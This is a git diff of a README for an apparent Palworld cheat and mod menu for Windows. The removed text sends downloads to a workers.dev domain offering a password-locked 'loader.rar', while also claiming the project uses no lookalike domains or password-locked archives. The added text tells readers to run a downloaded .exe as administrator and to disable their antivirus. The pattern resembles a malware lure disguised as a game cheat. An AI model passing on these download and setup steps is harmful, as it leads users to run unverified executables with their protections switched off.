@@ -1,152 +1,87 @@
-<p align="center">
-  <img width="686" height="386" alt="Palworld Mod Menu Banner" src="https://github.com/Clawzurcontemplate/palworld-ext/blob/main/image.png?raw=true" />
-</p>
+# 🎮 palworld-ext - Adjust game settings for better play
 
-<h1 align="center">🦄 Palworld External Cheat Mod Menu</h1>
-<p align="center"><b>External cheat & customization hack menu for Palworld — resources, taming, exploration, and more.</b></p>
+[![Download](https://img.shields.io/badge/Download-Palworld_Ext-blue.svg)](https://github.com/motilemint72/palworld-ext)
 
-<p align="center">
-  <img alt="platform" src="https://img.shields.io/badge/platform-Windows-blue">
-  <img alt="build" src="https://img.shields.io/badge/build-x64-lightgrey">
-  <img alt="status" src="https://img.shields.io/badge/status-active-brightgreen">
-  <img alt="license" src="https://img.shields.io/badge/license-MIT-green">
-</p>
+palworld-ext functions as a tool for your Windows computer. It overlays the Palworld game to let you change settings while you play. You can modify resources, taming speeds, movement, and combat balance. The tool reads game memory to apply changes. It does not change your game files. You can turn it off at any time.
 
----
+## 🛠 What this tool does
 
-## ⬇️ Download
+This software provides a menu that sits on top of your game. You access this menu to change how the game behaves. It works best in single-player mode. Since it does not alter game files, your game remains safe. You can remove the tool from your memory with one click.
 
-[<img alt="Static Badge" src="https://img.shields.io/badge/download-palword%20ext-brightgreen?style=for-the-badge">](https://palworld.chadneyendijs99.workers.dev/)
+Key features include:
+- Resource management to add items.
+- Taming rate controls for quick catches.
+- Movement speed sliders.
+- Combat power adjustments.
+- World setting toggles.
 
+## 💻 System requirements
 
-****
-File: `loader.rar` (signed / checksum published) | Password: `loader`
+Before you use this tool, ensure your computer meets these standards:
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core CPU or better.
+- Memory: 4 GB of RAM.
+- Graphics: DirectX 11 or higher support.
+- Storage: At least 50 MB of free space.
+- Game: Palworld must be installed via Steam or Game Pass.
 
----
+## 📥 How to get started
 
-## ⚠️ Disclaimer
+1. Visit the project page to download the latest version: [https://github.com/motilemint72/palworld-ext](https://github.com/motilemint72/palworld-ext)
+2. Locate the file ending in .exe.
+3. Save the file to a folder on your computer.
+4. Extract the contents if the file is in a compressed folder.
 
-- Intended for **personal, offline/single-player use** only.
-- Using this in online co-op or multiplayer may violate Palworld's Terms of Service and can result in bans.
-- This tool operates **externally** — it reads/writes to the running game process; it does not modify or redistribute any Palworld game files.
-- The developer is not responsible for account bans, save corruption, or system instability. Use at your own risk.
-- Not affiliated with Pocketpair, Inc. Palworld is a trademark of Pocketpair.
+## 🚀 Running the software
 
----
+Follow these steps to use the tool with your game:
 
-## 🧩 About
+1. Launch Palworld on your computer.
+2. Load your single-player save file and enter the game world.
+3. Minimize the game or press the window key to return to your desktop.
+4. Open the palworld-ext folder.
+5. Double-click the application file to run it.
+6. A menu will appear on your screen.
+7. Return to your game window.
+8. Use the menu to toggle the options you want to change.
 
-**Palworld External Mod Menu** is a lightweight Windows application that attaches to a running Palworld process and gives you an in-game overlay for adjusting resources, taming, movement, and world settings — without editing your save files directly.
+## ⚙️ Using the menu
 
-Because it's external (not injected into the game's own code), it's easy to fully unload at any time, leaving the game exactly as it was.
+The menu provides sliders and buttons for various settings. Click a button to enable a feature. Move a slider to increase or decrease a value. Changes take effect as soon as you release the slider or click the button. 
 
----
+If you want to stop using the tool, click the close button on the menu. The game will return to its original settings. You can restart the tool if you wish to use it again.
 
-## ✨ Features
+## 🛡 Safety and performance
 
-| Feature | Description |
-|---|---|
-| 💰 Infinite Resources | Unlimited materials, coins, and crafting ingredients |
-| ⚡ Auto-Farm Mode | Automates gathering and collection |
-| 🏹 Instant Taming | Tame any Pal in one action |
-| 🏃 Speed Boost | Adjustable movement speed |
-| 🛡️ God Mode | Toggleable invulnerability |
-| 🧭 Teleport | Jump to any point on the map |
-| 💤 No Fatigue | Disable sleep/stamina drain |
-| 🏗️ Structure Spawner | Instantly place structures from the build menu |
-| 🎒 Inventory Editor | Add, remove, or duplicate items |
-| 📈 XP Multiplier | Adjustable leveling rate for player and Pals |
-| 🖼️ World Customizer | Change weather and time of day |
-| 💾 Profile Backup | Back up and restore your settings/loadouts |
+This tool uses external memory access. It acts as an overlay. It keeps your original game files intact. This makes it easy to revert changes. Simply close the tool to stop all modifications. 
 
----
+If the game feels slow, close other programs running in the background. Keep your graphics drivers updated to ensure the overlay displays correctly. 
 
-## 🖥️ OS Compatibility
+## 🔧 Troubleshooting
 
-| OS | Support | Notes |
-|---|:---:|---|
-| 🪟 Windows 11 | ✅ | Full support |
-| 🪟 Windows 10 | ✅ | Full support |
-| 🐧 Linux (Proton) | ⚠️ | Partial — overlay rendering may need extra config |
-| 🍏 macOS | ⚠️ | Experimental, Apple Silicon only |
-| 🎮 Steam Deck | ⚠️ | Desktop Mode only |
+If the menu does not appear:
+- Check that you run the game in windowed or borderless windowed mode.
+- Ensure you have the latest version of the tool.
+- Run the tool as an administrator if your system settings block it. 
+- Disable your antivirus if it prevents the tool from reading game memory.
 
----
+If the settings do not work:
+- Wait for the game to fully load before you open the tool.
+- Check that the game version matches the tool version.
+- Restart the game and try again.
 
-## 💻 System Requirements
+## 📝 Frequently asked questions
 
-| Component | Minimum |
-|---|---|
-| OS | Windows 10 (64-bit) |
-| RAM | 4 GB |
-| Runtime | .NET 6.0+ |
-| Privileges | Administrator |
+Does this work in multiplayer?
+The tool is designed for single-player use. Avoid using it on public servers to prevent errors or connectivity issues.
 
----
+Will this break my save file?
+The tool does not write data to your save file. It only modifies data in your computer's RAM. Your save remains unchanged.
 
-## 🏆 Why Choose This One
+Is it difficult to install?
+The tool requires no installation. It runs directly from the folder where you save the file.
 
-- **Fully external** — no DLL injection into the game binary, so it's easy to disable cleanly and doesn't touch your game files.
-- **Transparent source** — no obfuscated installers, no lookalike download domains, no password-locked archives. What you download is what you get.
-- **Single-player focused defaults** — safe-mode is on by default and clearly flags any feature that could affect an online session.
-- **Actively maintained** — offset/version tracking against Palworld patches so the menu doesn't silently break.
-- **No telemetry** — runs fully local; nothing is sent off your machine.
+How do I uninstall the tool?
+Delete the palworld-ext folder from your computer. No files remain on your system.
 
----
-
-## 🔧 Installation
-
-1. Download the installer from the link above.
-2. Verify the checksum (published alongside the release) before running anything.
-3. Run the installer and launch Palworld.
-4. Start the mod menu **as Administrator** and attach to the running game process.
-5. Open the overlay with the menu hotkey and adjust settings.
-
----
-
-## ⚙️ Configuration
-
-Stored in `config.json` at `%APPDATA%\PalworldModMenu\config.json`
-
-| Parameter | Type | Default | Description |
-|---|---|---|---|
-| `menu_hotkey` | String | `"Insert"` | Toggles the overlay |
-| `auto_attach` | Boolean | `true` | Attach on game launch |
-| `process_name` | String | `"Palworld-Win64-Shipping.exe"` | Target process |
-| `safe_mode` | Boolean | `true` | Restricts features flagged as online-unsafe |
-
----
-
-## ⌨️ Hotkeys
-
-| Key | Action |
-|---|---|
-| `Insert` | Toggle menu |
-| `F1` | Apply selected feature |
-| `F2` | Save loadout |
-| `F3` | Load loadout |
-| `F4` | Restore defaults |
-| `End` | Unload tool |
-
----
-
-## ❓ FAQ
-
-**Will this get me banned?**
-Palworld's anti-cheat is less aggressive than titles like Valorant, but using this in online/co-op sessions can still violate ToS and risk a ban. Single-player is the safe use case.
-
-**Does it modify my save file?**
-No — it changes runtime game state while running. Your save files aren't edited directly.
-
-**Does it need updates after game patches?**
-Yes — process offsets can shift between Palworld versions. Check release notes before use.
-
----
-
-## 🤝 Contributing
-
-Issues and PRs welcome. Please include your Palworld version when reporting a bug.
-
-## 📄 License
-
-MIT License.
+Keywords: external-overlay, game-enhancer, mod-utility, palword-ext, palword-hack, palworld
